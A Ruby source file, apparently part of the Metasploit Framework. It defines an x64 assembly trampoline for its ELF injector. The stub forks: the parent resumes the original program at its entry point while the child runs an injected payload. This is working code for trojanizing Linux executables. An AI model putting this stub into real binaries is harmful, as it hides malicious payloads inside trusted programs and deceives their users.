# frozen_string_literal: true

module Msf
  module Exe
    class ElfInjector
      # Builds an x64 trampoline that forks before running the payload.
      class X64
        ASSEMBLY = %q{
          pushfq
          push rax
          push rcx
          push rdx
          push rbx
          push rbp
          push rsi
          push rdi
          push r8
          push r9
          push r10
          push r11
          push r12
          push r13
          push r14
          push r15
          push 57
          pop rax
          syscall
          test rax, rax
          jz child
          pop r15
          pop r14
          pop r13
          pop r12
          pop r11
          pop r10
          pop r9
          pop r8
          pop rdi
          pop rsi
          pop rbp
          pop rbx
          pop rdx
          pop rcx
          pop rax
          popfq
          jmp entrypoint
        child:
          pop r15
          pop r14
          pop r13
          pop r12
          pop r11
          pop r10
          pop r9
          pop r8
          pop rdi
          pop rsi
          pop rbp
          pop rbx
          pop rdx
          pop rcx
          pop rax
          popfq
        }

        # @param entrypoint [Integer] Original ELF entry point.
        # @param injected_address [Integer] Virtual address of the injected segment.
        def initialize(entrypoint:, injected_address:)
          @entrypoint = entrypoint
          @injected_address = injected_address
        end

        # @return [String] Encoded x64 trampoline.
        def generate
          shellcode = Metasm::Shellcode.assemble(Metasm::X64.new, ASSEMBLY)
          shellcode.base_addr = @injected_address
          shellcode.encode_string('entrypoint' => @entrypoint)
        end
      end
    end
  end
end
